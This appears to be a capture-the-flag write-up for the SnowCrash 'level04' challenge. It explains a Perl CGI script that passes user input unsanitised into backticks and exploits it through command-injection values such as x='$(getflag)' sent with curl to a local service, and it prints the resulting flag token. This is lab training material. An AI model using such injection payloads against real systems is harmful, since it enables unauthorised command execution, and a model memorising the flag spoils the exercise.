# Level04



# context

after logged in with user `level04` a file named `level04.pl` pops up in home dir.


# Steps to reproduce

first I tried to run the executable file
```
level04@SnowCrash:~$ ./level04.pl
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
	LANGUAGE = (unset),
	LC_ALL = (unset),
	LC_TERMINAL_VERSION = "3.4.19",
	LC_CTYPE = "UTF-8",
	LC_TERMINAL = "iTerm2",
	LANG = "en_US.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
Content-type: text/html


level04@SnowCrash:~$
```

some warnings and useless text printed so I tried to read the file data
```
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
level04@SnowCrash:~$
```

if you read the file carefully you noted the `use CGI qw{param};` line, what is `CGI`? well `CGI` stands for **Common Gateway Interface**, it’s a protocol for executing scripts via web requests,

so there's a hint that to solve this level you have to use some sort of web requests but to what?

there's a comment line `# localhost:4747`.
let's send request to this host and see:
```
level04@SnowCrash:~$ curl localhost:4747

level04@SnowCrash:~$
```

hmmmm, an empty response.


after reading the whole code and figure out what the scrip doing found out that.

so basicly what the script tries to do is:

1. import `param` from `CGI`.
2. then sending our http header
3. declar function (in perl named subroutine) named `x`.
4. take the first parameter `$_[0]` and assgin it to variable `$y`.
5. pass what ever the value of `$y` to echo.

so thw vulnerability in this script is I can pass anything to echo and it will execute it.

let's try it:
```
level04@SnowCrash:~$ ./level04.pl x='hello world'
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
	LANGUAGE = (unset),
	LC_ALL = (unset),
	LC_TERMINAL_VERSION = "3.4.19",
	LC_CTYPE = "UTF-8",
	LC_TERMINAL = "iTerm2",
	LANG = "en_US.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
Content-type: text/html

hello world
level04@SnowCrash:~$
```

if you ignore the warnings you will find that `hello world` is printed at the end

now let's try to pass a shell command to the `x`
```
level04@SnowCrash:~$ ./level04.pl x='$(ls )'
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
	LANGUAGE = (unset),
	LC_ALL = (unset),
	LC_TERMINAL_VERSION = "3.4.19",
	LC_CTYPE = "UTF-8",
	LC_TERMINAL = "iTerm2",
	LANG = "en_US.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
Content-type: text/html

level04.pl
level04@SnowCrash:~$
```

as you can see the `ls` command output is printed.

so to get the flag let's pass `getflag` and see if the flag will be printed.
```
level04@SnowCrash:~$ ./level04.pl x='$(getflag)'
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
	LANGUAGE = (unset),
	LC_ALL = (unset),
	LC_TERMINAL_VERSION = "3.4.19",
	LC_CTYPE = "UTF-8",
	LC_TERMINAL = "iTerm2",
	LANG = "en_US.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
Content-type: text/html

Check flag.Here is your token : Nope there is no token here for you sorry. Try again :)
level04@SnowCrash:~$
```

the printed message is the same as if I taped `getflag` directly in the shell prompt.

that's normal beccause the user executing command is `level04` not `flag04`.

remomber when we try to `curl localhost:4747` an empty line printed meaning `curl` was able to connect with the host

now le's combine all of our information 

1. a server is running in port 4747
2. there's a parameter `x` can be passed to the `echo` function.
3. echo will execute anything passed to it

the final payload is:
```
level04@SnowCrash:~$ curl localhost:4747/?x='$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
level04@SnowCrash:~$
```

as you can see the server execute `getflag` with `flag04` user and give us the flag back.
